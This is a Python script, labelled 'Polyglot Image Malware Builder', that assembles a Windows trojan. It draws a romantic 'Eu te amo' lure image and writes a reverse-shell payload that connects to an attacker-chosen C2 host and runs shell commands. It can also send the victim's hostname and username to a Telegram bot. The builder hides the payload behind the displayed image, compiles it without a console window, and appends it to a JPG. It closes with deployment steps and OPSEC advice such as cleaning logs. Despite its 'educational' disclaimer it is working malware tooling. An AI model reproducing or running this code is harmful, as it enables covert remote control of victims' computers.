#!/usr/bin/env python3
"""
╔═══════════════════════════════════════════════════════════════╗
║           POLYGLOT IMAGE MALWARE BUILDER - WINDOWS           ║
║                    APT-Style Framework                        ║
║                      Omega Corps                              ║
╚═══════════════════════════════════════════════════════════════╝

Advanced Persistent Threat Simulation Tool
Educational & Research Purposes Only
"""

import os
import sys
import base64
import subprocess
from datetime import datetime
from PIL import Image, ImageDraw, ImageFont

class Colors:
    """Terminal colors for Windows"""
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    MAGENTA = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    BOLD = '\033[1m'
    RESET = '\033[0m'

def enable_ansi_colors():
    """Enable ANSI colors on Windows"""
    if sys.platform == 'win32':
        os.system('')  # Enable ANSI escape sequences

def banner():
    """Display APT-style banner"""
    enable_ansi_colors()
    print(f"{Colors.CYAN}{Colors.BOLD}")
    print("""
    ╔═══════════════════════════════════════════════════════════════╗
    ║     ██████╗  ██████╗ ██╗  ██╗   ██╗ ██████╗ ██╗      ██████╗ ║
    ║     ██╔══██╗██╔═══██╗██║  ╚██╗ ██╔╝██╔════╝ ██║     ██╔═══██╗║
    ║     ██████╔╝██║   ██║██║   ╚████╔╝ ██║  ███╗██║     ██║   ██║║
    ║     ██╔═══╝ ██║   ██║██║    ╚██╔╝  ██║   ██║██║     ██║   ██║║
    ║     ██║     ╚██████╔╝███████╗██║   ╚██████╔╝███████╗╚██████╔╝║
    ║     ╚═╝      ╚═════╝ ╚══════╝╚═╝    ╚═════╝ ╚══════╝ ╚═════╝ ║
    ║                                                                ║
    ║              POLYGLOT IMAGE MALWARE BUILDER                   ║
    ║                  Windows Edition v1.0                         ║
    ╚═══════════════════════════════════════════════════════════════╝
    """)
    print(f"{Colors.RESET}")
    print(f"{Colors.YELLOW}[*] Framework: APT Simulation Toolkit{Colors.RESET}")
    print(f"{Colors.YELLOW}[*] Target OS: Windows x64{Colors.RESET}")
    print(f"{Colors.YELLOW}[*] Build Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}{Colors.RESET}")
    print(f"{Colors.RED}[!] Educational Use Only - Unauthorized use is illegal{Colors.RESET}")
    print("=" * 80)
    print()

def log_info(msg):
    print(f"{Colors.BLUE}[*]{Colors.RESET} {msg}")

def log_success(msg):
    print(f"{Colors.GREEN}[+]{Colors.RESET} {msg}")

def log_error(msg):
    print(f"{Colors.RED}[-]{Colors.RESET} {msg}")

def log_warning(msg):
    print(f"{Colors.YELLOW}[!]{Colors.RESET} {msg}")

def create_love_image(output_path="love.jpg"):
    """Generate romantic image for social engineering"""
    
    log_info("Generating social engineering image...")
    
    # Create gradient background
    img = Image.new('RGB', (1200, 800), color=(255, 192, 203))
    draw = ImageDraw.Draw(img)
    
    # Gradient effect
    for y in range(800):
        color = (255, int(192 - y/10), int(203 - y/15))
        draw.line([(0, y), (1200, y)], fill=color)
    
    try:
        font_large = ImageFont.truetype("C:\\Windows\\Fonts\\arial.ttf", 100)
        font_small = ImageFont.truetype("C:\\Windows\\Fonts\\arial.ttf", 40)
    except:
        font_large = ImageFont.load_default()
        font_small = ImageFont.load_default()
    
    # Main text
    text = "Eu te amo ❤"
    bbox = draw.textbbox((0, 0), text, font=font_large)
    w = bbox[2] - bbox[0]
    x = (1200 - w) // 2
    
    # Shadow
    draw.text((x+3, 303), text, fill=(200, 100, 150), font=font_large)
    # Main text
    draw.text((x, 300), text, fill=(255, 20, 147), font=font_large)
    
    # Subtitle
    subtext = "Você é especial para mim"
    bbox2 = draw.textbbox((0, 0), subtext, font=font_small)
    w2 = bbox2[2] - bbox2[0]
    x2 = (1200 - w2) // 2
    draw.text((x2, 500), subtext, fill=(255, 105, 180), font=font_small)
    
    img.save(output_path, 'JPEG', quality=95)
    log_success(f"Image generated: {output_path}")
    return output_path

def create_payload_exe(c2_host, c2_port, telegram_token=None, telegram_chat=None):
    """Generate Windows payload with C2 capabilities"""
    
    log_info("Generating payload code...")
    
    if telegram_token and telegram_chat:
        # Versão com Telegram
        payload = f'''
import socket
import subprocess
import os
import platform
import requests
from threading import Thread
import time

TELEGRAM_TOKEN = "{telegram_token}"
TELEGRAM_CHAT = "{telegram_chat}"

def send_telegram(msg):
    try:
        url = f"https://api.telegram.org/bot{{TELEGRAM_TOKEN}}/sendMessage"
        requests.post(url, json={{"chat_id": TELEGRAM_CHAT, "text": msg}})
    except:
        pass

def reverse_shell():
    try:
        s = socket.socket()
        s.connect(("{c2_host}", {c2_port}))
        
        info = f"[+] Conectado!\\nOS: {{platform.system()}}\\nHost: {{socket.gethostname()}}\\nUser: {{os.getlogin()}}"
        send_telegram(info)
        
        while True:
            cmd = s.recv(4096).decode().strip()
            if cmd.lower() in ['exit', 'quit']:
                break
            try:
                output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT)
                s.send(output)
            except Exception as e:
                s.send(f"Error: {{e}}\\n".encode())
        s.close()
    except Exception as e:
        send_telegram(f"[-] Erro: {{e}}")

if __name__ == "__main__":
    Thread(target=reverse_shell, daemon=True).start()
    time.sleep(999)
'''
    else:
        # Versão só com reverse shell
        payload = f'''
import socket
import subprocess
import os
import platform
from threading import Thread
import time

def reverse_shell():
    try:
        s = socket.socket()
        s.connect(("{c2_host}", {c2_port}))
        s.send(f"[+] Connected from {{platform.system()}} {{socket.gethostname()}}\\n".encode())
        
        while True:
            cmd = s.recv(4096).decode().strip()
            if cmd.lower() in ['exit', 'quit']:
                break
            try:
                output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT)
                s.send(output)
            except Exception as e:
                s.send(f"Error: {{e}}\\n".encode())
        s.close()
    except:
        pass

if __name__ == "__main__":
    Thread(target=reverse_shell, daemon=True).start()
    time.sleep(999)
'''
    
    log_success("Payload code generated")
    return payload

def create_wrapper_script(image_path, payload_code):
    """Create wrapper that displays image and executes payload"""
    
    log_info("Creating wrapper script...")
    
    # Lê imagem e converte pra Base64
    with open(image_path, 'rb') as f:
        image_b64 = base64.b64encode(f.read()).decode()
    
    wrapper = f'''
import base64
import tempfile
import os
import subprocess
from threading import Thread

# Imagem embutida em Base64
IMAGE_DATA = """{image_b64}"""

def show_image():
    """Mostra a imagem para não levantar suspeitas"""
    try:
        # Decodifica imagem
        img_data = base64.b64decode(IMAGE_DATA)
        
        # Salva em temp
        temp_path = os.path.join(tempfile.gettempdir(), "love_photo.jpg")
        with open(temp_path, 'wb') as f:
            f.write(img_data)
        
        # Abre imagem (Windows)
        os.startfile(temp_path)
    except:
        pass

def run_payload():
    """Executa payload em background"""
    {payload_code}

if __name__ == "__main__":
    # Mostra imagem
    Thread(target=show_image, daemon=True).start()
    
    # Executa payload
    run_payload()
'''
    
    log_success("Wrapper script created")
    return wrapper

def build_exe(script_path, output_name, icon_path=None):
    """Compile Python to EXE using PyInstaller"""
    
    log_info("Compiling to executable...")
    log_warning("This may take a few minutes...")
    
    cmd = [
        "pyinstaller",
        "--onefile",
        "--noconsole",
        "--clean",
        f"--name={output_name}",
    ]
    
    if icon_path and os.path.exists(icon_path):
        cmd.append(f"--icon={icon_path}")
    
    cmd.append(script_path)
    
    try:
        result = subprocess.run(cmd, capture_output=True, text=True)
        if result.returncode == 0:
            log_success("Executable compiled successfully!")
            return True
        else:
            log_error(f"Compilation failed: {result.stderr}")
            return False
    except FileNotFoundError:
        log_error("PyInstaller not found!")
        log_info("Install with: pip install pyinstaller")
        return False

def create_polyglot(jpg_path, exe_path, output_path):
    """Cria arquivo polyglot JPG+EXE"""
    
    print("[*] Criando polyglot JPG+EXE...")
    
    # Lê JPG
    with open(jpg_path, 'rb') as f:
        jpg_data = f.read()
    
    # Lê EXE
    with open(exe_path, 'rb') as f:
        exe_data = f.read()
    
    # Combina: JPG + padding + EXE
    # O Windows executa o EXE, visualizadores mostram o JPG
    polyglot_data = jpg_data + b'\x00' * 100 + exe_data
    
    # Salva como .exe (mas contém JPG no início)
    with open(output_path, 'wb') as f:
        f.write(polyglot_data)
    
    print(f"[+] Polyglot criado: {output_path}")
    print(f"[+] Tamanho JPG: {len(jpg_data)} bytes")
    print(f"[+] Tamanho EXE: {len(exe_data)} bytes")
    print(f"[+] Tamanho total: {len(polyglot_data)} bytes")

def main():
    banner()
    
    log_info("Starting malware builder...")
    print()
    
    # Configuration
    print(f"{Colors.BOLD}[CONFIGURATION]{Colors.RESET}")
    print("-" * 80)
    
    c2_host = input(f"{Colors.CYAN}C2 Host (IP/domain): {Colors.RESET}").strip() or "127.0.0.1"
    c2_port = input(f"{Colors.CYAN}C2 Port [4444]: {Colors.RESET}").strip() or "4444"
    
    use_telegram = input(f"{Colors.CYAN}Enable Telegram notifications? (y/N): {Colors.RESET}").strip().lower()
    telegram_token = None
    telegram_chat = None
    
    if use_telegram == 'y':
        telegram_token = input(f"{Colors.CYAN}Telegram Bot Token: {Colors.RESET}").strip()
        telegram_chat = input(f"{Colors.CYAN}Telegram Chat ID: {Colors.RESET}").strip()
    
    output_name = input(f"{Colors.CYAN}Output filename [love_photo]: {Colors.RESET}").strip() or "love_photo"
    
    print()
    print("-" * 80)
    print()
    
    # Build process
    log_info("Initiating build process...")
    print()
    
    # Step 1: Create image
    print(f"{Colors.BOLD}[STEP 1/5]{Colors.RESET} Social Engineering Asset")
    image_path = "temp_love.jpg"
    create_love_image(image_path)
    print()
    
    # Step 2: Generate payload
    print(f"{Colors.BOLD}[STEP 2/5]{Colors.RESET} Payload Generation")
    payload_code = create_payload_exe(c2_host, int(c2_port), telegram_token, telegram_chat)
    print()
    
    # Step 3: Create wrapper
    print(f"{Colors.BOLD}[STEP 3/5]{Colors.RESET} Wrapper Creation")
    wrapper_code = create_wrapper_script(image_path, payload_code)
    
    wrapper_path = "temp_wrapper.py"
    with open(wrapper_path, 'w') as f:
        f.write(wrapper_code)
    log_success(f"Wrapper saved: {wrapper_path}")
    print()
    
    # Step 4: Compile
    print(f"{Colors.BOLD}[STEP 4/5]{Colors.RESET} Compilation")
    if not build_exe(wrapper_path, output_name):
        log_error("Build failed!")
        return
    print()
    
    # Step 5: Finalize
    print(f"{Colors.BOLD}[STEP 5/5]{Colors.RESET} Finalization")
    exe_path = f"dist/{output_name}.exe"
    
    if os.path.exists(exe_path):
        # Get file size
        size = os.path.getsize(exe_path)
        size_mb = size / (1024 * 1024)
        
        log_success(f"Executable created: {exe_path}")
        log_info(f"File size: {size_mb:.2f} MB")
        print()
        
        # Cleanup
        try:
            os.remove(image_path)
            os.remove(wrapper_path)
            os.remove(f"{output_name}.spec")
        except:
            pass
        
        # Final instructions
        print("=" * 80)
        print(f"{Colors.GREEN}{Colors.BOLD}[BUILD COMPLETE]{Colors.RESET}")
        print("=" * 80)
        print()
        print(f"{Colors.BOLD}Output:{Colors.RESET} {exe_path}")
        print(f"{Colors.BOLD}C2 Server:{Colors.RESET} {c2_host}:{c2_port}")
        print()
        print(f"{Colors.YELLOW}[DEPLOYMENT INSTRUCTIONS]{Colors.RESET}")
        print("-" * 80)
        print(f"1. Start C2 server: {Colors.CYAN}python c2_server.py {c2_port}{Colors.RESET}")
        print(f"2. Deploy payload: {Colors.CYAN}{exe_path}{Colors.RESET}")
        print(f"3. Target executes → Image displays + Payload connects")
        print(f"4. Control via C2 shell")
        print()
        print(f"{Colors.RED}[OPSEC REMINDER]{Colors.RESET}")
        print("-" * 80)
        print("• Use VPN/Proxy for C2 traffic")
        print("• Encrypt C2 communications (future update)")
        print("• Clean logs after operation")
        print("• Educational use only - Obtain authorization")
        print()
        print("=" * 80)
        
    else:
        log_error("Executable not found!")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n[*] Interrompido pelo usuário")
        sys.exit(0)
